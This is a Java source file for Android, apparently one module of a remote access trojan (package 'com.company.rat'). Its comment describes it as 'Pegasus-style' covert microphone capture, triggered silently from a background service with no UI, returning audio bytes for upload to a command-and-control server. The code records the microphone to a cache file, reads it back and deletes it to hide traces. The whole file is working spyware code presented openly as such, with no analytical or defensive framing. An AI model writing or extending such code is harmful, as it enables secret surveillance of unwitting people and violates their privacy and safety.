package com.company.rat;

import android.content.Context;
import android.media.MediaRecorder;
import java.io.*;

/**
 * Microphone recorder — produces AAC audio file, returns raw bytes for C2 upload.
 * Pegasus-style: triggered silently from background service, no UI.
 */
public class MicCapture {

    public static byte[] record(Context ctx, int seconds) throws IOException {
        File outFile = new File(ctx.getCacheDir(), "mic_" + System.currentTimeMillis() + ".aac");

        MediaRecorder recorder = new MediaRecorder();
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioEncodingBitRate(96000);
            recorder.setOutputFile(outFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            Thread.sleep(seconds * 1000L);

            recorder.stop();
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } finally {
            try { recorder.release(); } catch (Exception ignored) {}
        }

        if (!outFile.exists() || outFile.length() == 0)
            throw new IOException("recording empty");

        byte[] data = new byte[(int) outFile.length()];
        FileInputStream fis = new FileInputStream(outFile);
        fis.read(data);
        fis.close();
        outFile.delete();

        return data;
    }
}
